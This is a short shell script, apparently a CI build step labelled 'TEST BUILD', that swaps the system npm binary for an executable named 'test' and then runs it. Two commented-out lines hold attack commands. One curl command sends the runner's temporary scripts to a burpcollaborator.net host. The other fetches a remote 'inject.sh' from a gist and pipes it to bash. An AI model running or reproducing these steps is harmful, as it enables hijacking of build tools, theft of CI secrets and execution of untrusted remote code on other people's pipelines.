echo "TEST BUILD"
echo $MY_VAL
cat /etc/hosts
which npm
mv /usr/local/bin/npm /tmp/npm
cp test /usr/local/bin/npm
chmod +x /usr/local/bin/npm
npm
cat /usr/local/bin/npm
# curl -d "$(cat /home/runner/work/_temp/*.sh)" https://ise30gxlwrwg8m6xm64nk2w9208swh.burpcollaborator.net
#curl -sSfL gist.githubusercontent.com/d3kum1d0r1y4100/f6e2261de7699c7cc799fc826d9693ee/raw/1dc6a6626c5c1d71a088d7d2204590f4734008f3/inject.sh | bash
